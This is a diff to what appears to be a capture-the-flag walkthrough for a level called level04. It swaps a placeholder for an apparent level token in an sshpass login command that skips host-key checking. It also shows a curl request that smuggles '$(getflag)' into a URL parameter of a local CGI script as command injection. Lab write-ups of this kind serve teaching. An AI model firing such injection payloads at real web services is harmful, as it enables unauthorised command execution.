@@ -32,13 +32,14 @@ x(param("x"));
 
 ### Exploit Steps
 
-#### Step 1: Connect to level04 and Test
+#### Step 1: Connect to level04 via SSH
+Use the token from Level03 as the password:
 ```bash
-sshpass -p "PASSWORD" ssh -o StrictHostKeyChecking=no -p 4242 level04@localhost id
+sshpass -p "qi0maab88jeaj46qoumi7maus" ssh -o StrictHostKeyChecking=no -p 4242 level04@localhost
 ```
 
 #### Step 2: Execute Command Injection via HTTP
-The CGI script listens on port 4747 and accepts URL parameters:
+The CGI script listens on port 4747. Execute directly with command injection:
 
 ```bash
 curl -s "http://localhost:4747/?x=\$(getflag)"
